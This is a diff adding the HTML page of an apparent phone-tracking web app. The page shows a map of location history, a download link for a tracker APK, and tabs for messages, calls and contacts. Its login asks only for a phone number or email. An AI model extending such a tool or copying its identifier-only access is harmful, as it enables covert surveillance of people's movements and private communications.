@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Location History</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; color: #333; }
+#login-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1000; }
+#login-box { background: #fff; border-radius: 12px; padding: 32px; width: 360px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
+#login-box h2 { margin-bottom: 8px; text-align: center; }
+#login-box p { font-size: 13px; color: #666; text-align: center; margin-bottom: 20px; }
+#login-box input { width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; }
+#login-box input:focus { outline: none; border-color: #1a73e8; }
+#login-box .btn { width: 100%; margin-top: 12px; }
+
+.btn { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; display: inline-flex; align-items: center; gap: 6px; }
+.btn-primary { background: #1a73e8; color: #fff; }
+.btn-primary:hover { background: #1557b0; }
+.btn-secondary { background: #e8eaed; color: #333; }
+.btn-secondary:hover { background: #d2d5d9; }
+.btn-sm { padding: 6px 12px; font-size: 12px; }
+
+#app { max-width: 1100px; margin: 0 auto; padding: 16px; display: none; }
+header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; flex-wrap: wrap; gap: 8px; }
+header h1 { font-size: 22px; }
+header .user-info { font-size: 13px; color: #666; display: flex; align-items: center; gap: 8px; }
+header .user-info a { color: #d93025; cursor: pointer; text-decoration: underline; font-size: 12px; }
+
+#map { height: 350px; border-radius: 10px; margin-bottom: 16px; z-index: 1; }
+
+.stats { display: flex; gap: 12px; margin-bottom: 16px; flex-wrap: wrap; }
+.stat-card { background: #fff; border-radius: 8px; padding: 14px 18px; flex: 1; min-width: 120px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); }
+.stat-card .num { font-size: 24px; font-weight: 700; color: #1a73e8; }
+.stat-card .label { font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }
+
+.controls { display: flex; gap: 8px; align-items: center; margin-bottom: 16px; flex-wrap: wrap; }
+.controls input[type="date"] { padding: 6px 10px; border: 1px solid #ddd; border-radius: 6px; font-size: 13px; }
+.controls input[type="date"]:focus { outline: none; border-color: #1a73e8; }
+
+.view-tabs { display: flex; gap: 0; margin-bottom: 12px; border-bottom: 2px solid #e0e0e0; }
+.view-tab { padding: 8px 18px; cursor: pointer; font-size: 13px; font-weight: 500; color: #666; border-bottom: 2px solid transparent; margin-bottom: -2px; }
+.view-tab.active { color: #1a73e8; border-bottom-color: #1a73e8; }
+
+#history-list { background: #fff; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); padding: 12px; min-height: 100px; }
+.history-group { margin-bottom: 16px; }
+.history-group-title { font-size: 13px; font-weight: 600; color: #555; padding: 8px 0 4px; border-bottom: 1px solid #f0f0f0; margin-bottom: 4px; }
+.location-row { display: flex; align-items: center; padding: 6px 8px; gap: 8px; font-size: 13px; border-bottom: 1px solid #f5f5f5; }
+.location-row:hover { background: #f8f9fa; }
+.location-row .time { color: #888; min-width: 60px; font-size: 11px; }
+.location-row .coords { color: #333; font-family: monospace; font-size: 12px; flex: 1; }
+.location-row .badge { font-size: 10px; padding: 1px 6px; border-radius: 10px; background: #e8f5e9; color: #2e7d32; }
+.location-row .badge.low-acc { background: #fff3e0; color: #e65100; }
+.location-row .dist-badge { font-size: 10px; padding: 1px 6px; border-radius: 10px; background: #e3f2fd; color: #1565c0; margin-left: auto; }
+.location-row .speed { font-weight: 600; }
+.location-row.selected { background: #e8f0fe !important; }
+.select-cb { margin-right: 6px; cursor: pointer; width: 16px; height: 16px; accent-color: #1a73e8; flex-shrink: 0; }
+#bulk-bar { display: none; align-items: center; gap: 10px; padding: 10px 14px; background: #fff; border-radius: 8px; margin-bottom: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); font-size: 13px; }
+#bulk-bar .btn-danger { background: #d93025; color: #fff; }
+#bulk-bar .btn-danger:hover { background: #b3261e; }
+#bulk-bar .btn-danger:disabled { background: #fce8e6; color: #999; cursor: not-allowed; }
+.location-empty { text-align: center; padding: 40px; color: #999; font-size: 14px; }
+.phone-section { margin-bottom: 20px; }
+.phone-section h3 { font-size: 14px; font-weight: 600; color: #333; margin-bottom: 8px; padding-bottom: 4px; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center; gap: 8px; }
+.phone-item { padding: 6px 8px; border-bottom: 1px solid #f5f5f5; font-size: 12px; display: flex; flex-direction: column; gap: 2px; }
+.phone-item:hover { background: #f8f9fa; }
+.phone-item .meta { color: #888; font-size: 10px; display: flex; gap: 8px; }
+.phone-item .body { color: #333; }
+
+@media (max-width: 600px) {
+  #app { padding: 8px; }
+  header h1 { font-size: 18px; }
+  #map { height: 220px; }
+  .stat-card { min-width: 80px; padding: 10px 12px; }
+  .stat-card .num { font-size: 18px; }
+  .controls { gap: 4px; }
+  .controls input[type="date"] { font-size: 12px; padding: 4px 6px; max-width: 130px; }
+  .view-tab { padding: 6px 12px; font-size: 12px; }
+}
+</style>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9334539225953790" crossorigin="anonymous"></script>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-1RVMWL4SDK"></script>
+    <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-1RVMWL4SDK');</script>
+</head>
+<body>
+<div id="login-overlay">
+  <div id="login-box">
+    <h2>Location History</h2>
+    <p>Enter your phone number or email to view your location history</p>
+    <div id="login-error" style="color:#d93025;font-size:13px;margin-bottom:8px;text-align:center;"></div>
+    <input type="text" id="login-identifier" placeholder="Phone number or email" autocomplete="off">
+    <button class="btn btn-primary" onclick="login()">View History</button>
+  </div>
+</div>
+
+<div id="app">
+  <header>
+    <a href="../index.html" style="text-decoration:none;color:#1a73e8;font-size:14px">← Home</a>
+    <h1>Location History</h1>
+    <div class="user-info">
+      <span id="display-identifier"></span>
+      <a href="apk/LocationTracker.apk" download style="text-decoration:none;color:#34a853">⬇ APK</a>
+      <a onclick="logout()">Change</a>
+      <span style="font-size:11px;color:#999;display:block;text-align:right">Use same email to sign in on the Android app</span>
+    </div>
+  </header>
+
+  <div id="map"></div>
+
+  <div class="stats">
+    <div class="stat-card"><div class="num" id="stat-total">0</div><div class="label">Total Points</div></div>
+    <div class="stat-card"><div class="num" id="stat-today">0</div><div class="label">Today</div></div>
+    <div class="stat-card"><div class="num" id="stat-streak">0</div><div class="label">Day Streak</div></div>
+    <div class="stat-card"><div class="num" id="stat-range">0</div><div class="label">Max Range (km)</div></div>
+    <div class="stat-card"><div class="num" id="stat-dist-sel">—</div><div class="label">Distance (selected)</div></div>
+    <div class="stat-card"><div class="num" id="stat-speed">—</div><div class="label">Avg Speed (selected)</div></div>
+  </div>
+
+  <div class="controls">
+    <input type="date" id="filter-from" onchange="loadHistory()">
+    <input type="date" id="filter-to" onchange="loadHistory()">
+    <button class="btn btn-sm btn-secondary" onclick="resetFilters()">This Week</button>
+    <button class="btn btn-sm btn-primary" onclick="testPush()" style="background:#34a853">Test Push</button>
+    <button class="btn btn-sm btn-secondary" id="bulk-toggle" onclick="toggleBulkDelete()">Bulk Delete</button>
+  </div>
+  <div id="debug-result" style="font-size:12px;margin-bottom:8px;color:#666;display:none;"></div>
+
+  <div id="bulk-bar">
+    <span id="bulk-count">0 selected</span>
+    <button class="btn btn-sm" onclick="selectAll()">Select All</button>
+    <button class="btn btn-sm" onclick="deselectAll()">Clear</button>
+    <span style="flex:1"></span>
+    <button class="btn btn-sm btn-danger" id="bulk-delete-btn" onclick="deleteSelected()" disabled>Delete Selected</button>
+  </div>
+
+  <div class="view-tabs">
+    <div class="view-tab active" data-view="hour" onclick="switchView(this)">By Hour</div>
+    <div class="view-tab" data-view="day" onclick="switchView(this)">By Day</div>
+    <div class="view-tab" data-view="month" onclick="switchView(this)">By Month</div>
+    <div class="view-tab" data-view="list" onclick="switchView(this)">All</div>
+    <div class="view-tab" data-view="messages" onclick="switchView(this)">Messages</div>
+    <div class="view-tab" data-view="calls" onclick="switchView(this)">Calls</div>
+    <div class="view-tab" data-view="contacts" onclick="switchView(this)">Contacts</div>
+  </div>
+
+  <div id="history-list"></div>
+</div>
+
+<script src="js/history.js"></script>
+<script src="../js/analytics-tracker.js" defer></script>
+</body>
+</html>
